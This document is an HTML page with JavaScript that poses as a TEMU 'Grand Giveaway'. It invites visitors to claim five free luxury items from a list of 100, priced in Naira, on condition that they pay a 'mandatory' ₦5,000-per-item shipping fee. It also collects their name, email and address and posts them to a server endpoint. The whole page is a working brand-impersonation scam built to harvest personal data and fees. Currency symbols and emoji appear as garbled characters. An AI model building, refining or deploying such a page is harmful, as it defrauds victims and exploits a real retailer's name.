<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TEMU | Grand Giveaway Claim</title>
    <!-- Load Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Use Inter font -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f7f7f7;
            background-image: linear-gradient(135deg, #f7f7f7 0%, #e0f2fe 100%);
        }
        /* Custom scrollbar for the items container */
        .custom-scroll::-webkit-scrollbar {
            width: 8px;
        }
        .custom-scroll::-webkit-scrollbar-track {
            background: #e0f2fe;
            border-radius: 10px;
        }
        .custom-scroll::-webkit-scrollbar-thumb {
            background: #3b82f6;
            border-radius: 10px;
        }
        .custom-scroll::-webkit-scrollbar-thumb:hover {
            background: #2563eb;
        }
        /* Style for selected items */
        .item-card.selected {
            border-color: #10b981;
            background-color: #ecfdf5;
            box-shadow: 0 4px 6px -1px rgba(16, 185, 129, 0.1), 0 2px 4px -2px rgba(16, 185, 129, 0.06);
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <!-- Main Application Container -->
    <div id="app-container" class="w-full max-w-4xl bg-white p-8 rounded-xl shadow-2xl transition-all duration-300">
        
        <header class="text-center mb-8 border-b pb-4">
            <h1 class="text-4xl font-extrabold text-blue-600 mb-2">TEMU Grand Giveaway</h1>
            <p class="text-xl text-gray-700">Claim Your 5 Valuable Items!</p>
            <p class="text-sm text-red-500 font-semibold mt-2">Maximum of 5 items allowed per claim.</p>
        </header>

        <!-- Dynamic Content Area -->
        <div id="dynamic-content">

            <!-- Claim Form Section -->
            <form id="claim-form" class="space-y-6">

                <!-- Step 1: Item Selection -->
                <section>
                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>
                        1. Select Your Items (Max 5)
                    </h2>
                    
                    <!-- Items Grid Container -->
                    <div id="items-container" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 max-h-96 overflow-y-auto p-2 bg-gray-50 rounded-lg border custom-scroll">
                        <!-- Items will be injected here by JavaScript -->
                    </div>

                    <!-- Summary Bar -->
                    <div class="mt-4 p-3 bg-blue-100 rounded-lg flex justify-between items-center text-blue-800 font-semibold shadow-inner">
                        <span id="item-count">Selected: 0 / 5</span>
                        <span id="shipping-fee">Estimated Shipping Fee (NGN): 0.00</span>
                    </div>
                </section>

                <!-- Step 2: User Information -->
                <section>
                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
                        2. Contact & Shipping Details
                    </h2>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <input type="text" id="name" placeholder="Full Name" required 
                               class="p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150">
                        <input type="email" id="email" placeholder="Email Address" required 
                               class="p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150">
                    </div>

                    <textarea id="address" placeholder="Full Shipping Address (Street, City, State, ZIP)" rows="3" required 
                              class="mt-4 p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150"></textarea>
                </section>

                <!-- Step 3: Payment/Submission -->
                <section>
                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
                        3. Confirm Payment and Claim
                    </h2>

                    <div class="p-4 bg-yellow-50 border-l-4 border-yellow-500 text-yellow-800 rounded-lg shadow-md mb-4">
                        <p class="font-bold">Shipping Notice:</p>
                        <p class="text-sm">You are claiming your items for free, but a mandatory shipping/logistics fee of **â‚¦<span id="final-shipping-fee">0.00</span>** must be paid upon delivery. By submitting, you confirm this agreement.</p>
                    </div>

                    <button type="submit" id="submit-button" 
                            class="w-full py-3 px-4 bg-green-600 text-white font-bold rounded-lg hover:bg-green-700 transition duration-300 transform hover:scale-[1.01] flex items-center justify-center disabled:opacity-50">
                        <span id="button-text">CONFIRM CLAIM & SHIPMENT AGREEMENT</span>
                        <svg id="loading-spinner" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                    </button>
                </section>
            </form>

        </div>

        <!-- Message Modal (Hidden by default) -->
        <div id="message-modal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center p-4 z-50">
            <div class="bg-white p-8 rounded-xl shadow-3xl max-w-sm w-full text-center space-y-4">
                <svg id="modal-icon" class="w-16 h-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <!-- Icon placeholder -->
                </svg>
                <h3 id="modal-title" class="text-2xl font-bold">Message Title</h3>
                <p id="modal-body" class="text-gray-600">Message body content.</p>
                <button onclick="window.location.reload();" class="w-full py-2 px-4 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition duration-150">
                    Close
                </button>
            </div>
        </div>

    </div>

    <script>
        const API_ENDPOINT = '/submit-claim';
        const MAX_ITEMS = 5;
        const SHIPPING_FEE_PER_ITEM = 5000; // â‚¦5,000 per item for logistics

        const ELEMENTS = {
            itemsContainer: document.getElementById('items-container'),
            itemCount: document.getElementById('item-count'),
            shippingFeeDisplay: document.getElementById('shipping-fee'),
            finalShippingFeeDisplay: document.getElementById('final-shipping-fee'),
            claimForm: document.getElementById('claim-form'),
            submitButton: document.getElementById('submit-button'),
            loadingSpinner: document.getElementById('loading-spinner'),
            buttonText: document.getElementById('button-text'),
            messageModal: document.getElementById('message-modal'),
            modalIcon: document.getElementById('modal-icon'),
            modalTitle: document.getElementById('modal-title'),
            modalBody: document.getElementById('modal-body'),
        };

        const itemDatabase = [
            // ELECTRONICS & TECH (25 items)
            { id: 1, name: "Apple iPhone 15 Pro Max", category: "Electronics", value: "â‚¦1,800,000", icon: "ðŸ“±" },
            { id: 2, name: "Samsung Galaxy S24 Ultra", category: "Electronics", value: "â‚¦1,600,000", icon: "ðŸ“±" },
            { id: 3, name: "Sony PS5 Console (Disc)", category: "Electronics", value: "â‚¦750,000", icon: "ðŸŽ®" },
            { id: 4, name: "Microsoft Xbox Series X", category: "Electronics", value: "â‚¦700,000", icon: "ðŸŽ®" },
            { id: 5, name: "MacBook Pro M3 Max", category: "Electronics", value: "â‚¦4,500,000", icon: "ðŸ’»" },
            { id: 6, name: "Dell XPS 15 Laptop", category: "Electronics", value: "â‚¦2,200,000", icon: "ðŸ’»" },
            { id: 7, name: "DJI Mavic 3 Pro Drone", category: "Electronics", value: "â‚¦1,500,000", icon: "ðŸš" },
            { id: 8, name: "Oculus Meta Quest 3 VR", category: "Electronics", value: "â‚¦850,000", icon: "ðŸ•¶ï¸" },
            { id: 9, name: "Samsung 65\" OLED TV", category: "Electronics", value: "â‚¦3,000,000", icon: "ðŸ“º" },
            { id: 10, name: "Bose QuietComfort Ultra", category: "Electronics", value: "â‚¦450,000", icon: "ðŸŽ§" },
            { id: 11, name: "Apple Watch Ultra 2", category: "Electronics", value: "â‚¦650,000", icon: "âŒš" },
            { id: 12, name: "Canon EOS R5 Camera", category: "Electronics", value: "â‚¦3,500,000", icon: "ðŸ“¸" },
            { id: 13, name: "Google Pixel 8 Pro", category: "Electronics", value: "â‚¦1,400,000", icon: "ðŸ“±" },
            { id: 14, name: "iPad Pro 12.9 (M2)", category: "Electronics", value: "â‚¦1,300,000", icon: " tablet" },
            { id: 15, name: "Logitech G Pro Racing Wheel", category: "Electronics", value: "â‚¦600,000", icon: "ðŸŽï¸" },
            { id: 16, name: "Samsung Galaxy Tab S9 Ultra", category: "Electronics", value: "â‚¦1,000,000", icon: " tablet" },
            { id: 17, name: "GoPro HERO12 Black", category: "Electronics", value: "â‚¦400,000", icon: "ðŸŽ¥" },
            { id: 18, name: "High-End Gaming PC (RTX 4090)", category: "Electronics", value: "â‚¦5,000,000", icon: "ðŸ–¥ï¸" },
            { id: 19, name: "Sonos Arc Soundbar", category: "Electronics", value: "â‚¦800,000", icon: "ðŸ”Š" },
            { id: 20, name: "AirPods Pro (2nd Gen)", category: "Electronics", value: "â‚¦300,000", icon: "ðŸŽ§" },
            { id: 21, name: "Tesla Powerwall 2 (Battery)", category: "Electronics", value: "â‚¦6,000,000", icon: "âš¡" },
            { id: 22, name: "Smart Home Security System", category: "Electronics", value: "â‚¦550,000", icon: "ðŸ”’" },
            { id: 23, name: "Kindle Oasis (Latest Gen)", category: "Electronics", value: "â‚¦250,000", icon: "ðŸ“–" },
            { id: 24, name: "HP Spectre x360", category: "Electronics", value: "â‚¦1,900,000", icon: "ðŸ’»" },
            { id: 25, name: "FPV Racing Drone Kit", category: "Electronics", value: "â‚¦950,000", icon: "âœˆï¸" },
            
            // FASHION & LUXURY (25 items)
            { id: 26, name: "Rolex Submariner Watch", category: "Luxury", value: "â‚¦10,000,000", icon: "ðŸ‘‘" },
            { id: 27, name: "Gucci Dionysus Bag", category: "Luxury", value: "â‚¦3,500,000", icon: "ðŸ‘œ" },
            { id: 28, name: "Louis Vuitton Keepall BandouliÃ¨re", category: "Luxury", value: "â‚¦4,000,000", icon: "ðŸ’¼" },
            { id: 29, name: "Valentino Garavani Sneakers", category: "Fashion", value: "â‚¦800,000", icon: "ðŸ‘Ÿ" },
            { id: 30, name: "Balenciaga Puffer Jacket", category: "Fashion", value: "â‚¦2,500,000", icon: "ðŸ§¥" },
            { id: 31, name: "Burberry Trench Coat", category: "Fashion", value: "â‚¦3,000,000", icon: "ðŸ§¥" },
            { id: 32, name: "Cartier Love Bracelet", category: "Luxury", value: "â‚¦7,000,000", icon: "ðŸ’" },
            { id: 33, name: "Chanel Classic Flap Bag", category: "Luxury", value: "â‚¦12,000,000", icon: "ðŸ‘œ" },
            { id: 34, name: "Dior B23 High-Top Sneaker", category: "Fashion", value: "â‚¦1,200,000", icon: "ðŸ‘Ÿ" },
            { id: 35, name: "Fendi Zucca Scarf", category: "Fashion", value: "â‚¦500,000", icon: "ðŸ§£" },
            { id: 36, name: "Prada Nylon Backpack", category: "Fashion", value: "â‚¦2,800,000", icon: "ðŸŽ’" },
            { id: 37, name: "Omega Seamaster Watch", category: "Luxury", value: "â‚¦5,500,000", icon: "âŒš" },
            { id: 38, name: "HermÃ¨s Birkin Bag (Mini)", category: "Luxury", value: "â‚¦30,000,000", icon: "ðŸ‘œ" },
            { id: 39, name: "Tiffany & Co. Diamond Necklace", category: "Luxury", value: "â‚¦8,000,000", icon: "ðŸ’Ž" },
            { id: 40, name: "Saint Laurent Leather Jacket", category: "Fashion", value: "â‚¦4,500,000", icon: "ðŸ§¥" },
            { id: 41, name: "Nike Air Jordan 1 OG (Rare)", category: "Fashion", value: "â‚¦1,500,000", icon: "ðŸ‘Ÿ" },
            { id: 42, name: "Versace Baroque Robe", category: "Fashion", value: "â‚¦900,000", icon: "ðŸ›" },
            { id: 43, name: "Montblanc MeisterstÃ¼ck Pen", category: "Luxury", value: "â‚¦400,000", icon: "ðŸ–‹ï¸" },
            { id: 44, name: "Bvlgari Serpenti Sunglasses", category: "Fashion", value: "â‚¦750,000", icon: "ðŸ•¶ï¸" },
            { id: 45, name: "Tom Ford Suit (Bespoke)", category: "Luxury", value: "â‚¦6,000,000", icon: "ðŸ¤µ" },
            { id: 46, name: "Christian Louboutin Heels", category: "Fashion", value: "â‚¦1,100,000", icon: "ðŸ‘ " },
            { id: 47, name: "Givenchy Antigona Bag", category: "Fashion", value: "â‚¦3,200,000", icon: "ðŸ‘œ" },
            { id: 48, name: "Patek Philippe Cufflinks", category: "Luxury", value: "â‚¦1,800,000", icon: "ðŸ”—" },
            { id: 49, name: "Canada Goose Expedition Parka", category: "Fashion", value: "â‚¦1,600,000", icon: "ðŸ§¥" },
            { id: 50, name: "Fendi Baguette Bag", category: "Luxury", value: "â‚¦4,800,000", icon: "ðŸ‘œ" },

            // HOME, KITCHEN & LIFESTYLE (25 items)
            { id: 51, name: "Viking Professional 7 Series Range", category: "Home", value: "â‚¦4,000,000", icon: "ðŸ³" },
            { id: 52, name: "Smeg Retro Refrigerator", category: "Home", value: "â‚¦1,500,000", icon: "ðŸ§Š" },
            { id: 53, name: "Peloton Bike+ Full Package", category: "Lifestyle", value: "â‚¦1,800,000", icon: "ðŸš´" },
            { id: 54, name: "Dyson V15 Detect Vacuum", category: "Home", value: "â‚¦500,000", icon: "ðŸ§¹" },
            { id: 55, name: "Tempur-Pedic King Mattress", category: "Home", value: "â‚¦2,500,000", icon: "ðŸ›ï¸" },
            { id: 56, name: "Riedel Decanter Set (Crystal)", category: "Lifestyle", value: "â‚¦300,000", icon: "ðŸ·" },
            { id: 57, name: "Thermomix TM6 Smart Cooker", category: "Kitchen", value: "â‚¦900,000", icon: "ðŸ§‘â€ðŸ³" },
            { id: 58, name: "High-End Espresso Machine (La Marzocco)", category: "Kitchen", value: "â‚¦2,000,000", icon: "â˜•" },
            { id: 59, name: "Sonos Home Theater System", category: "Home", value: "â‚¦1,500,000", icon: "ðŸ " },
            { id: 60, name: "Luxury Scent Diffuser (Jo Malone)", category: "Lifestyle", value: "â‚¦200,000", icon: "ðŸ•¯ï¸" },
            { id: 61, name: "Outdoor Pizza Oven (Ooni Pro)", category: "Kitchen", value: "â‚¦700,000", icon: "ðŸ•" },
            { id: 62, name: "Samsung Smart Fridge Hub", category: "Home", value: "â‚¦4,500,000", icon: "ðŸ§Š" },
            { id: 63, name: "Eames Lounge Chair and Ottoman", category: "Luxury", value: "â‚¦5,000,000", icon: "ðŸª‘" },
            { id: 64, name: "iRobot Roomba j9+ Robot Vacuum", category: "Home", value: "â‚¦650,000", icon: "ðŸ¤–" },
            { id: 65, name: "Top-Tier Air Purifier (Blueair)", category: "Home", value: "â‚¦400,000", icon: "ðŸ’¨" },
            { id: 66, name: "Vitamix Ascent Series Blender", category: "Kitchen", value: "â‚¦350,000", icon: "ðŸ¥¤" },
            { id: 67, name: "Artisanal Knife Set (Shun)", category: "Kitchen", value: "â‚¦850,000", icon: "ðŸ”ª" },
            { id: 68, name: "Golf Simulator Setup (Trackman)", category: "Lifestyle", value: "â‚¦15,000,000", icon: "â›³" },
            { id: 69, name: "Billiard Table (Regulation Size)", category: "Lifestyle", value: "â‚¦3,000,000", icon: "ðŸŽ±" },
            { id: 70, name: "Professional Stand Mixer (KitchenAid)", category: "Kitchen", value: "â‚¦300,000", icon: "ðŸŽ‚" },
            { id: 71, name: "Patio Furniture Set (Rattan, 8pc)", category: "Home", value: "â‚¦1,200,000", icon: "ðŸ›‹ï¸" },
            { id: 72, name: "Smart Garden Hydroponics System", category: "Home", value: "â‚¦250,000", icon: "ðŸŒ±" },
            { id: 73, name: "Top-of-the-Line Gaming Chair (Secretlab)", category: "Lifestyle", value: "â‚¦450,000", icon: "ðŸ’º" },
            { id: 74, name: "Electric Fireplace Insert", category: "Home", value: "â‚¦950,000", icon: "ðŸ”¥" },
            { id: 75, name: "Designer Artwork Print (Signed)", category: "Luxury", value: "â‚¦1,000,000", icon: "ðŸ–¼ï¸" },

            // TRANSPORTATION & COMMERCIAL GEAR (25 items)
            { id: 76, name: "Electric Scooter (Segway GT2)", category: "Transport", value: "â‚¦1,100,000", icon: "ðŸ›´" },
            { id: 77, name: "High-End Road Bike (Pinarello)", category: "Transport", value: "â‚¦3,500,000", icon: "ðŸš²" },
            { id: 78, name: "Commercial 3D Printer (UltiMaker)", category: "Commercial", value: "â‚¦5,000,000", icon: "ðŸ–¨ï¸" },
            { id: 79, name: "Solar Panel System (5kW Residential)", category: "Commercial", value: "â‚¦7,000,000", icon: "â˜€ï¸" },
            { id: 80, name: "Go-Kart Racing Package (High Performance)", category: "Transport", value: "â‚¦2,000,000", icon: "ðŸŽï¸" },
            { id: 81, name: "Professional DSLR Gimbal Stabilizer", category: "Commercial", value: "â‚¦600,000", icon: "ðŸŽ¬" },
            { id: 82, name: "Commercial-Grade Pressure Washer", category: "Commercial", value: "â‚¦450,000", icon: "ðŸ’§" },
            { id: 83, name: "Electric Cargo Bike", category: "Transport", value: "â‚¦1,500,000", icon: "ðŸ“¦" },
            { id: 84, name: "High-End Car Diagnostics Tool", category: "Commercial", value: "â‚¦800,000", icon: "ðŸ”§" },
            { id: 85, name: "Folding Kayak (Advanced Model)", category: "Transport", value: "â‚¦750,000", icon: "ðŸ›¶" },
            { id: 86, name: "Electric Motorcycle (Zero S)", category: "Transport", value: "â‚¦6,500,000", icon: "ðŸï¸" },
            { id: 87, name: "Tractor Drone for Agriculture", category: "Commercial", value: "â‚¦4,000,000", icon: "ðŸŒ¾" },
            { id: 88, name: "Heavy-Duty Workshop Compressor", category: "Commercial", value: "â‚¦900,000", icon: "ðŸ­" },
            { id: 89, name: "Electric Skateboard (Boosted Board)", category: "Transport", value: "â‚¦550,000", icon: "ðŸ›¹" },
            { id: 90, name: "Professional Woodworking Router Table", category: "Commercial", value: "â‚¦1,300,000", icon: "ðŸ”¨" },
            { id: 91, name: "Portable Generator (Honda EU7000is)", category: "Commercial", value: "â‚¦2,500,000", icon: "ðŸ”Œ" },
            { id: 92, name: "Carbon Fiber Mountain Bike (Full Suspension)", category: "Transport", value: "â‚¦4,500,000", icon: "ðŸšµ" },
            { id: 93, name: "Large Format Laser Engraver", category: "Commercial", value: "â‚¦3,800,000", icon: "ðŸ”¥" },
            { id: 94, name: "Professional Sewing/Embroidery Machine", category: "Commercial", value: "â‚¦1,700,000", icon: "ðŸ§µ" },
            { id: 95, name: "Water Sports Paddleboard Set", category: "Transport", value: "â‚¦400,000", icon: "ðŸ„" },
            { id: 96, name: "High-Powered Binoculars (Zeiss)", category: "Lifestyle", value: "â‚¦1,000,000", icon: "ðŸ”­" },
            { id: 97, name: "Heavy-Duty Workshop Tool Chest (Snap-on)", category: "Commercial", value: "â‚¦3,000,000", icon: "ðŸ› ï¸" },
            { id: 98, name: "Acoustic Guitar (Martin D-45)", category: "Luxury", value: "â‚¦2,200,000", icon: "ðŸŽ¸" },
            { id: 99, name: "Portable Satellite Internet Terminal", category: "Commercial", value: "â‚¦3,200,000", icon: "ðŸ›°ï¸" },
            { id: 100, name: "Electric Snow Blower", category: "Home", value: "â‚¦600,000", icon: "â„ï¸" }
        ];

        let selectedItems = [];

        // --- Utility Functions ---

        /**
         * Formats a number as Nigerian Naira (NGN).
         * @param {number} amount - The amount to format.
         */
        const formatNaira = (amount) => {
            return amount.toLocaleString('en-NG', {
                style: 'currency',
                currency: 'NGN',
                minimumFractionDigits: 2,
                maximumFractionDigits: 2,
            });
        };

        /**
         * Updates the display for item count and shipping fee.
         */
        const updateSummary = () => {
            const count = selectedItems.length;
            const fee = count * SHIPPING_FEE_PER_ITEM;

            ELEMENTS.itemCount.textContent = `Selected: ${count} / ${MAX_ITEMS}`;
            ELEMENTS.shippingFeeDisplay.textContent = `Estimated Shipping Fee (NGN): ${formatNaira(fee)}`;
            ELEMENTS.finalShippingFeeDisplay.textContent = formatNaira(fee).replace('â‚¦', ''); // Remove symbol for placement

            ELEMENTS.submitButton.disabled = count === 0;
            ELEMENTS.submitButton.classList.toggle('opacity-50', count === 0);
        };

        /**
         * Handles the click event for selecting or deselecting an item.
         * @param {object} item - The item object from the database.
         * @param {HTMLElement} card - The DOM element of the item card.
         */
        const toggleItemSelection = (item, card) => {
            const index = selectedItems.findIndex(i => i.id === item.id);

            if (index > -1) {
                // Deselect
                selectedItems.splice(index, 1);
                card.classList.remove('selected');
            } else if (selectedItems.length < MAX_ITEMS) {
                // Select
                selectedItems.push(item);
                card.classList.add('selected');
            } else {
                // Maximum reached
                showModal('Selection Limit Reached', `You can only select a maximum of ${MAX_ITEMS} items. Please deselect an item first.`, 'error');
            }
            updateSummary();
        };

        /**
         * Renders all 100 items into the grid.
         */
        const renderItems = () => {
            ELEMENTS.itemsContainer.innerHTML = '';
            itemDatabase.forEach(item => {
                const card = document.createElement('div');
                card.id = `item-${item.id}`;
                card.className = 'item-card p-3 border-2 border-gray-200 rounded-lg cursor-pointer hover:border-blue-400 transition duration-150 bg-white shadow-sm hover:shadow-md';
                card.innerHTML = `
                    <div class="text-3xl mb-1">${item.icon}</div>
                    <p class="font-semibold text-sm text-gray-900">${item.name}</p>
                    <p class="text-xs text-gray-500">${item.category}</p>
                    <p class="text-xs text-green-600 font-bold mt-1">${item.value}</p>
                `;
                card.addEventListener('click', () => toggleItemSelection(item, card));
                ELEMENTS.itemsContainer.appendChild(card);
            });
        };

        /**
         * Displays the success/error modal.
         */
        const showModal = (title, body, type) => {
            ELEMENTS.modalTitle.textContent = title;
            ELEMENTS.modalBody.textContent = body;
            
            // Set icon and color based on type
            let iconPath, colorClass;
            if (type === 'success') {
                iconPath = '<path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />';
                colorClass = 'text-green-500';
            } else {
                iconPath = '<path stroke-linecap="round" stroke-linejoin="round" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />';
                colorClass = 'text-red-500';
            }
            
            ELEMENTS.modalIcon.innerHTML = iconPath;
            ELEMENTS.modalIcon.className = `w-16 h-16 mx-auto ${colorClass}`;
            ELEMENTS.messageModal.classList.remove('hidden');
        };

        // --- Submission Handler ---

        ELEMENTS.claimForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            // Disable button and show spinner
            ELEMENTS.submitButton.disabled = true;
            ELEMENTS.buttonText.textContent = 'Processing Claim...';
            ELEMENTS.loadingSpinner.classList.remove('hidden');

            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const address = document.getElementById('address').value;
            const numberOfItems = selectedItems.length;
            const shippingFee = numberOfItems * SHIPPING_FEE_PER_ITEM;

            const payload = {
                timestamp: new Date().toISOString(),
                user_info: { name, email, address },
                items_claimed: selectedItems.map(item => ({
                    id: item.id,
                    name: item.name,
                    category: item.category,
                    value: item.value // Store the estimated value string
                })),
                item_count: numberOfItems,
                shipping_fee_ngn: shippingFee,
            };

            try {
                const response = await fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                const result = await response.json();
                
                if (response.ok) {
                    let title = 'Claim Successful!';
                    let message = `Congratulations, your ${numberOfItems} items have been reserved. Your unique Claim ID is: ${result.claimId || 'N/A'}. You will be contacted shortly for shipping confirmation.`;
                    
                    if (result.status === 'SUCCESS_NO_DB') {
                         message = `WARNING: Your claim was successfully processed, but the server indicated it could not save the data to the database. Your Claim ID is: ${result.claimId || 'N/A'}. Please check your server logs!`;
                    }

                    showModal(title, message, 'success');
                } else {
                    // Handle server-side errors (500 status from server.js catch block)
                    showModal('Claim Failed', `An error occurred: ${result.message || 'Server returned an unknown error.'}`, 'error');
                }
            } catch (error) {
                // Handle network errors (e.g., server offline)
                console.error('Network or Fetch Error:', error);
                showModal('Connection Error', 'Could not connect to the server. Please check your network connection and try again.', 'error');
            } finally {
                // Reset form state regardless of success or failure
                ELEMENTS.submitButton.disabled = false;
                ELEMENTS.buttonText.textContent = 'CONFIRM CLAIM & SHIPMENT AGREEMENT';
                ELEMENTS.loadingSpinner.classList.add('hidden');
            }
        });

        // --- Initialization ---
        document.addEventListener('DOMContentLoaded', () => {
            renderItems();
            updateSummary();
        });

    </script>
</body>
</html>